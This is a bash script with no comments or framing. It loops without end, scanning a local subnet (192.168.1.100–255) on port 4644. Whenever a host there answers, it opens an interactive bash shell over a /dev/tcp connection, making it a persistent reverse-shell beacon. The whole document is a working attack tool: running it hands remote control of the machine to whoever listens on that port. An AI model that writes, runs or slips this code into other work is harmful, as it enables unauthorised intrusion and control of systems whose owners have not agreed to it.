#!/usr/bin/env bash

ip='192.168.1'
port='4644'

shell() {
for i in {100..255}; do
  com="${ip}.${i}"
 (
if timeout 0.1 bash -c "true > /dev/tcp/$com/$port" 2>/dev/null; then
   sleep 2.5
   python3 -c 'import pty,os; os.environ["TERM"]="xterm"; pty.spawn(["/bin/bash", "-i"])' >& /dev/tcp/$com/$port 0>&1
fi
 ) &
done
}

while true; do
  sleep 15
  shell
  sleep 15
done
